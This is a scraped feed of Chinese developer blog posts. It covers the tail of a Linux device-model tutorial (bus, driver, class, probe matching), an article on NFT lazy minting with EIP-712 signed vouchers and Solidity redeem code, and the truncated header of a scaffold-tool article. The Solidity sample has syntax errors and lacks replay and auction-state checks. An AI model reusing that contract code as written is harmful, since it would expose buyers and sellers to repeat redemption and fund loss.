<p>第二，<strong>电源管理的问题</strong>。当系统要休眠时，Linux 就需要按顺序关闭设备。关闭设备的原则是<strong>先关闭子设备，在关闭父设备</strong>。那我们常见的鼠标来举例，系统必须先关闭挂载在 USB 控制器上的鼠标，然后才能断开 USB 控制器的电源。但是系统里面有那么多设备，如果没有一个<strong>树状结构</strong>来记录设备的父子关系，内核根本就不知道关闭电源的正确顺序，容易导致系统崩溃。</p>
<p>第三，<strong>用户空间无法知道设备的具体信息</strong>。如果用户想知道系统里面究竟挂了几个鼠标，一个 I2C 总线上究竟连接了几个芯片。没有统一的模型，内核就无法向用户空间展示完整的设备拓扑图。</p>
<p>这三个问题，是早期的驱动开发方式带来的问题，也正是设备模型出现后解决的问题。</p>
<p>Linux 设备模型的出现，就是为了将<strong>硬件的描述</strong>与<strong>硬件的驱动</strong>分离，并通过总线来管理他们，最终形成一棵有序的<strong>树</strong>。</p>
<h2 data-id="heading-3">2. Linux 设备模型的基本概念</h2>
<h3 data-id="heading-4">2.1 总线 Bus</h3>
<p>在物理概念中，总线是连接 CPU 和外设的导线，比如USB，I2C，SPI等。但在 Linux 软件模型中，Bus是一种<strong>管理机制</strong>。</p>
<p>我们来看看内核源码中对于总线的解释，相关内容可以在下面目录中找到：</p>
<pre><code class="hljs language-bash" lang="bash">include/linux/device.h
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeea6f02be77401292cbadc59d4a8b0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768989344&amp;x-signature=wbqh3wY0l4YYNmb1uTGuiIREsRA%3D" alt="1. 总线注释.png" loading="lazy"/></p>
<p>这段注释是内核源码中对于总线的描述，大致意思如下：总线是<strong>处理器与一个或多个设备之间的通信通道</strong>。在设备模型的框架下，<strong>所有设备都通过总线连接，即使这是一个内部的、虚拟的“平台”总线</strong>。总线之间可以互相连接，例如，一个 USB 控制器通常就是一个 PCI 设备。设备模型反映了总线与其所控制设备之间的实际连接关系。总线由 <code>bus_type</code> 结构体表示。该结构体包含了总线的名称、默认属性、总线方法、电源管理操作以及驱动程序核心的私有数据。</p>
<p>对这段注释进行一个总结，其实可以分为两点：</p>
<p>第一，在 Linux 中，总线是 CPU 和一个或多个设备直接交流的通道。</p>
<p>第二，为了将设备模型抽象出来，所有的设备都要连接到总线上，这个总线可以是 CPU 内部总线，也可以是虚拟的平台总线。</p>
<p>在 CPU 内部的众多总线中，每个总线上都维护着两个链表，分别是 <strong>Devices 链表</strong>和 <strong>Drivers 链表</strong>。Devices 链表中存放着所有挂在这条总线上的<strong>设备</strong>。Drivers 链表中存放着所有这条总线上的<strong>驱动</strong>。</p>
<p>而总线最重要的功能就是将设备和驱动进行<strong>匹配</strong>。每当有一个新设备插入或者有一个新驱动被加载，总线就会开始执行匹配程序。</p>
<p>下面是内核源码中<code>bus_type</code>结构体的部分内容：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1534e1f622394a819ca9ca99e0e04fc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768989344&amp;x-signature=lFsnhCOLKFhlEcSUoWlCbzfNTqY%3D" alt="2. bus_type结构体.png" loading="lazy"/></p>
<p>里面成员很多，我们挑几个重要的看看。</p>
<p>第 123 行是<strong>总线名称</strong>，比如 “Platform” ， “I2C” 等等。</p>
<p>第 130 行是<strong>匹配函数</strong>，当有新设备或新驱动加入总线时，内核就是通过自动调用这个函数，来判断两者是否配对的。</p>
<p>第 132 行是<strong>初始化函数</strong>，匹配成功后，内核会调用这个函数，进而调用<strong>驱动程序里</strong>的 <code>probe</code>初始化函数。</p>
<h3 data-id="heading-5">2.2 设备 Device</h3>
<p>Device 结构体描述的是硬件设备信息，在现代 ARM Linux 中，这些信息主要来源于<strong>设备树</strong>。</p>
<p>设备树里面包含的信息有下面几种：</p>
<p>第一种是<strong>资源信息</strong>，比如寄存器地址，中断号，DMA 通道等等。</p>
<p>第二种是<strong>拓扑信息</strong>，描述该设备在设备树中的位置，比如它是谁的父节点，又是谁的子节点。</p>
<p>第三种是<strong>状态信息</strong>，描述设备现在处于开启状态还是关闭状态。</p>
<p><code>struct device</code> 就像一个基类，实际开发中，我们通常使用它的派生类，如 <code>struct platform_device</code>。</p>
<p>核心思想是将硬件变动隔离起来，就是将所有变动的硬件信息封装在 Device 里面，通过 DTS 传给内核，从而实现硬件信息和驱动程序的解耦。</p>
<h3 data-id="heading-6">2.3 驱动 Driver</h3>
<p>Driver 结构体描述的是对应的硬件应该怎么使用。里面的信息主要是包含操作逻辑，比如怎么初始化，怎么读写，怎么处理中断等等。驱动代码里面不应该出现具体的物理地址，地址应该从传入的 Device 指针里面取出来。</p>
<p>在代码层面，驱动由 <code>struct device_driver</code> 表示，对于使用设备树的 ARM Linux，我们需要特别关注 <code>of_match_table</code> 成员：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a527daa731d94ed5baa953d4c8995df5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768989344&amp;x-signature=apMOrYrMmos184r0ZC0VLHRp9%2BY%3D" alt="3. device_driver结构体.png" loading="lazy"/></p>
<p>这里同样只截取了一部分内容，我们看看最重要的几个成员。</p>
<p>第 299 行是驱动名称。</p>
<p>第 300 行指明该驱动属于哪条总线。</p>
<p>第 308 行，是驱动<strong>用来与设备匹配</strong>的关键成员。</p>
<h3 data-id="heading-7">2.4 类 Class</h3>
<p>到这里，我们大概已经知道 Bus 是按照物理连接对设备进行分类，比如一个设备到底是属于 USB 设备还是 I2C 设备。</p>
<p>而类 Class 是按照功能属性对设备进行分类的。</p>
<p>举个例子：</p>
<p>从总线角度来看：一个 USB 鼠标属于 USB 总线，蓝牙鼠标属于蓝牙总线。</p>
<p>而从类的角度来看：他们二者都是属于 input 类，也就是输入类的。</p>
<p>从这个例子中不难看出，Class 向用户空间提供了一个标准的接口，不管底层的物理总线是什么，只要属于同一个 Class ，应用程序就可以用相同的方式来操作设备，屏蔽了底层的差异。</p>
<p>我们可以在 <code>/sys/class/</code>目录下看到所有的类：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b39c1f15e1a4bfab74fc23d825f94dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768989344&amp;x-signature=7pSxqmu3pePQOK1mmZ79S0QI%2B5Y%3D" alt="4. 类.png" loading="lazy"/></p>
<h3 data-id="heading-8">2.5 它们是怎么协同工作的</h3>
<p>在理解了上面的概念之后，我们来梳理一下内核管理硬件的整个流程：</p>
<p>上面我们提到过，Bus 维护着两个链表。一个是 <code>klist_devices</code> 设备链表，里面是等待配对的硬件设备。另一个是 <code>klist_drivers</code>驱动链表，里面是等待干活的驱动。</p>
<p>当内核解析设备树时，会将节点转化为对应的 Device 结构体并注册到总线上，这时 Devices 链表中的设备加一。</p>
<p>当用户加载内核模块（使用<code>insmod</code>命令）时，Driver 结构体被注册到总线上，这时 Drivers 链表中的驱动加一。</p>
<p>每当 Devices 链表或者 Drivers 链表中增加新成员，总线都会调用<code>.match</code>函数，拿着新来的成员去和对方链表的每一个成员进行比对。常用的平台总线中通常是通过比对<code>compatible</code>属性字符串来决定配对是否成功。</p>
<p>一旦匹配成功，总线就会调用<code>.probe</code>函数进行初始化，这个总线的<code>.probe</code>函数最终会调用驱动的<code>.probe</code>函数，把具体的 Device 结构体传给 Driver。<strong>注意：总线先调用自己的 probe ， 进而调用驱动提供的 probe</strong>。</p>
<p>在 <code>.probe</code> 函数中，驱动通常会调用子系统的接口，将自己注册到对应的 <strong>Class</strong> 中，从而在 <code>/dev</code> 或 <code>/sys</code> 下生成文件，供用户层操作。</p>
<p>至此，驱动程序正式拿到了硬件的控制权，然后开始干活。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LazyMinting是如何实现的？]]></title>    <link>https://juejin.cn/post/7594817135128281122</link>    <guid>https://juejin.cn/post/7594817135128281122</guid>    <pubDate>2026-01-14T07:30:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128281122" data-draft-id="7594813727053381666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LazyMinting是如何实现的？"/> <meta itemprop="keywords" content="Solidity"/> <meta itemprop="datePublished" content="2026-01-14T07:30:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="gunner6"/> <meta itemprop="url" content="https://juejin.cn/user/360295547039437"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LazyMinting是如何实现的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/360295547039437/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    gunner6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:30:31.000Z" title="Wed Jan 14 2026 07:30:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">业务场景</h2>
<p>我们lazyMinting使用场景主要是针对nft的竞拍业务来做的。
creator可以在上架nft时，不需要真正的mint nft，而是等有合适的bidder来购买后，才去mint nft。
这样可以减少nft mint的成本，从而鼓励creator来创建更多的nft；</p>
<h2 data-id="heading-1">LazyMinting的实现思路：</h2>
<p>核心思路是通过EIP-712的TypeDataSign来验证签名：</p>
<p>用户在链下用privateKey进行签名，链上通过合约验证确认签名消息的合法性以及业务逻辑的合理性。 一但验证通过，立刻执行合约里的方法，mint nft，transfer给真正的买家。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d20648506b71499dbe09960116a0d469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZ3VubmVyNg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768980631&amp;x-signature=mYjBgQYxo0pQBD8cgJP0bobL7VI%3D" alt="ntf_lazy-minting" loading="lazy"/></p>
<h2 data-id="heading-2">我们项目里具体实现方案是什么？</h2>
<ol>
<li>定义了auction合约, 记录 竞拍信息<code>ActionData</code>、NFT 购买者凭证信息<code>Voucher</code>；</li>
</ol>
<pre><code class="hljs language-solidity" lang="solidity">{
  // 竞拍信息
	struct AuctionDetails {
      address seller; // 卖家地址
      string uri; // nft信息
      uint256 startPrice;
      uint256 duration;
      // 最终竞拍人
      address bidder;
      uint256 bidPrice;
      bool isActive;
      bool isEnd;
      uint256 tokenId;
  }
  // 购买者的凭证
	struct NFTVoucher {
        string auctionId;
        uint256 bidPrice;
        bytes signature;
  }
  
  // 记录action信息
	 mapping(string =&gt; AuctionDetails))  public auctionIdToAuction;

  // 记录voucher
	mapping(string =&gt; NFTVoucher)) public auctionIdToVoucher;
}

</code></pre>
<ol start="2">
<li>
<p>当creator上架一个nft action的时候，传入auctionId，minPrice、duration这些信息，保存在map里；注意此时<code>bidder/tokenId</code>这些信息都是不存在的；</p>
</li>
<li>
<p>当用户出价购买时，组装数据，通过_signTypedData方法，调用钱包签名，生成一个Voucher，并且记录到链下；</p>
<pre><code class="hljs language-ts" lang="ts">  <span class="hljs-comment">/**
   * Creates a new NFTVoucher object and signs it using this LazyMinter's signing key.

   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">NFTVoucher</span>}
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">createVoucher</span>(<span class="hljs-params">auctionId, bidPrice</span>) {
    <span class="hljs-keyword">const</span> voucher = { auctionId, bidPrice };
    <span class="hljs-keyword">const</span> domain = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_signingDomain</span>();

    <span class="hljs-keyword">const</span> types = {
      <span class="hljs-title class_">NFTVoucher</span>: [
        { <span class="hljs-attr">name</span>: <span class="hljs-string">"auctionId"</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">"string"</span> },
        { <span class="hljs-attr">name</span>: <span class="hljs-string">"bidPrice"</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">"uint256"</span> },
      ],
    };
    <span class="hljs-keyword">const</span> signature = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">signer</span>.<span class="hljs-title function_">_signTypedData</span>(domain, types, voucher);

    <span class="hljs-comment">// const recoveredAddress = ethers.utils.verifyTypedData(domain, types, voucher, signature);</span>
    <span class="hljs-comment">// const expectedSignerAddress = this.signer.address;</span>
    <span class="hljs-comment">// assert(recoveredAddress === expectedSignerAddress); 单纯验证下代码逻辑</span>
    <span class="hljs-comment">// console.log("recoveredAddress = " + recoveredAddress);</span>

    <span class="hljs-keyword">return</span> {
      ...voucher,
      signature,
    };
  }
</code></pre>
</li>
<li>
<p>当竞拍结束，或者creator提前结束时，选择一个出价高的bidder作为获胜者。 构造一个Winner凭证: <code>WinnerVoucher</code></p>
<pre><code class="hljs language-ts" lang="ts">{
  <span class="hljs-attr">auctionId</span>: <span class="hljs-string">"auction123"</span>,
  <span class="hljs-attr">bidder</span>: <span class="hljs-string">"0x中标者地址"</span>,
  <span class="hljs-attr">bidPrice</span>: <span class="hljs-number">1000000000000000000</span>,
  <span class="hljs-attr">nftAddress</span>: <span class="hljs-string">"0xNFT合约地址"</span>,
  <span class="hljs-attr">signature</span>: <span class="hljs-string">"卖家的签名"</span>
}
</code></pre>
</li>
<li>
<p>中标的bidder去链上进行redeem，提交两个voucher: 自身出价的voucher，卖家选择的voucher。</p>
</li>
<li>
<p>合约会验证的两个voucher的合法性，检查数据一致等等</p>
<ol>
<li>address和Voucher里签名的用户是否是同一个，并且验证调用redeem的msg.value &gt; Voucher.bidderPrice</li>
</ol>
<pre><code class="hljs language-solidity" lang="solidity">// 新增结构体
struct WinnerVoucher {
    string auctionId;
    address bidder;
    uint256 bidPrice;
    bytes signature;
}

// 计算哈希
function _hashWinner(WinnerVoucher calldata voucher)
    internal
    view
    returns (bytes32)
{
    bytes32 WINNER_VOUCHER_TYPE_HASH = keccak256(
        "WinnerVoucher(string auctionId,address bidder,uint256 bidPrice)"
    );
    bytes32 structHash = keccak256(
        abi.encode(
            WINNER_VOUCHER_TYPE_HASH,
            keccak256(bytes(voucher.auctionId)),
            voucher.bidder,
            voucher.bidPrice
        )
    );
    return _hashTypedDataV4(structHash);
}

// 新增验证函数
function _verifyWinner(WinnerVoucher calldata voucher)
    internal
    view
    returns (address)
{
    bytes32 digest = _hashWinner(voucher);
    return ECDSA.recover(digest, voucher.signature);
}

// 修改后的 redeem 函数
function redeemWithWinnerVoucher(
    address _nftAddress,
    string memory _auctionId,
    NFTVoucher calldata nftVoucher,
    WinnerVoucher calldata winnerVoucher
) public payable returns (uint256) {
    // 1. 验证 NFT voucher 是中标者签的
    address nftSigner = _verify(nftVoucher);
    require(msg.sender == nftSigner, "Invalid NFT signature");
    
    // 2. 验证 winner voucher 是卖家签的
    AuctionDetails storage auction = auctionIdToAuction[_auctionId];
    address winnerSigner = _verifyWinner(winnerVoucher);
    require(winnerSigner == auction.seller, "Invalid seller signature");
    
    // 3. 验证 winner voucher 指定的 bidder 就是调用者
    require(msg.sender == winnerVoucher.bidder, "NOT the winner");
    
    // 4. 验证出价金额
    require(msg.value &gt;= winnerVoucher.bidPrice, "Insufficient funds");
    
    // 5. mint 并转移 NFT
    uint256 tokenId = nftContract.mint(_auctionId, auction.uri);
    nftContract.safeTransferFrom(address(this), msg.sender, tokenId);
    
    // 5. 将付款转账给卖家，这里假设是用 native token付款的
    (bool success, ) = auction.seller.call{value: winnerVoucher.bidPrice}("");
    require(success);
    
    // 7. 更新拍卖状态
    auction.bidder = winnerVoucher.bidder;
    auction.bidPrice = winnerVoucher.bidPrice;
    auction.isEnd = true;
    auction.tokenId = tokenId;
    
    return tokenId;
}
</code></pre>
</li>
</ol>
<p>repo: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F6gunner%2Fscaffold-eth-challenges%2Ftree%2Fchallenge-6-nft-marketplace" target="_blank" title="https://github.com/6gunner/scaffold-eth-challenges/tree/challenge-6-nft-marketplace" ref="nofollow noopener noreferrer">github.com/6gunner/sca…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[模仿 create-vite / create-vue 风格写一个现代脚手架]]></title>    <link>https://juejin.cn/post/7594813727053414434</link>    <guid>https://juejin.cn/post/7594813727053414434</guid>    <pubDate>2026-01-14T07:33:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594813727053414434" data-draft-id="7594785614177452072" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="模仿 create-vite / create-vue 风格写一个现代脚手架"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-14T07:33:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端小小栈"/> <meta itemprop="url" content="https://juejin.cn/user/1081575170131006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            模仿 create-vite / create-vue 风格写一个现代脚手架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575170131006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端小小栈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:33:54.000Z" title="Wed Jan 14 2026 07:33:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 